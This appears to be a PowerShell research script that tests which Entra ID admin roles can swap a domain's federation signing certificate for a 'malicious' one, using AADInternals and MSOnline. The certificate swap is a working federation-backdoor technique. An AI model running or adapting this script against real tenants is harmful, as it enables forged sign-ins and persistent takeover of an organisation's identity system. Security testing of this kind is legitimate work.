Import-Module AADInternals
Import-Module MSOnline

. .\config.ps1

if ($PSVersionTable.PSVersion.Major -ge 7) {
    Write-Error "MSOL isn't compatible with PowerShell 7+. Try again with PowerShell 5"
    return
}

$roles = @("globalAdmin", "securityAdmin", "hybridIdentityAdmin", "externalIdentityProviderAdmin", "domainNameAdmin", "partnerTier1Support", "partnerTier2Support")
# $roles = @("hybridIdentityAdmin")

foreach ($role in $roles) {
    Write-Host "---------------------- $role"
    $fqdn = "$role.$custom_domain_suffix"

    # first, use Global Admin account to add federation
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials["globalAdmin"].login, (ConvertTo-SecureString -String $credentials["globalAdmin"].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    $atg = Get-AADIntAccessTokenForMSGraph -Credentials $Credential
    Connect-MsolService -AdGraphAccessToken $at -MsGraphAccessToken $atg
    
    # disable federation to clear everything
    Set-MsolDomainAuthentication -DomainName $fqdn -Authentication Managed

    # ensure it's applied
    do {
        Start-Sleep 2
        $domain = $null
        $domain = Get-MsolDomain -DomainName $fqdn
    } while ($null -eq $domain -or $domain.Authentication -ne "Managed")

    # re-enable federation
    Set-MsolDomainAuthentication -DomainName $fqdn -Authentication Federated -SigningCertificate $benign_cert -IssuerUri "https://$fqdn/$('{0:X}' -f (Get-Date).GetHashCode())" -LogOffUri "https://example.com/logoff" -PassiveLogOnUri "https://example.com/logon"

    # ensure it's applied
    do {
        Start-Sleep 2
        $domain = $null
        $domain = Get-MsolDomain -DomainName $fqdn
    } while ($null -eq $domain -or $domain.Authentication -ne "Federated")
    do {
        Start-Sleep 2
        $foundconf = $null
        $foundconf = Get-MsolDomainFederationSettings -DomainName $fqdn
    } while ($null -eq $foundconf -or $foundconf.SigningCertificate -ne $benign_cert)


    # now, log as target user and try changing federation config (with $malicious_cert instead)
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials[$role].login, (ConvertTo-SecureString -String $credentials[$role].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    $atg = Get-AADIntAccessTokenForMSGraph -Credentials $Credential
    Connect-MsolService -AdGraphAccessToken $at -MsGraphAccessToken $atg


    Start-Sleep 5
    do {
        $retry = $false
        $continue = $false
        try {
            Set-MSOLDomainFederationSettings -DomainName $fqdn -SigningCertificate $malicious_cert -ErrorAction Stop
        }
        catch {
            if ($_.Exception.Message -eq "Unknown error occurred." -or $_.Exception.Message -like "*authentication type is not federated") {
                Write-Host "Transient error, retrying..."
                Start-Sleep 2
                $retry = $true
            }
            else {
                Write-Host "[-] It failed :( '$_'"
                $retry = $false
                $continue = $true
            }
        }
    } while ($retry)
    if ($continue) { continue }

    # check if it's applied
    do {
        $foundconf = $null
        $foundconf = Get-MsolDomainFederationSettings -DomainName $fqdn
        Start-Sleep 2
    } while ($null -eq $foundconf -or $foundconf.SigningCertificate -ne $malicious_cert)


    Write-Host "[+] It worked :) Maliciouscert push is confirmed"
}
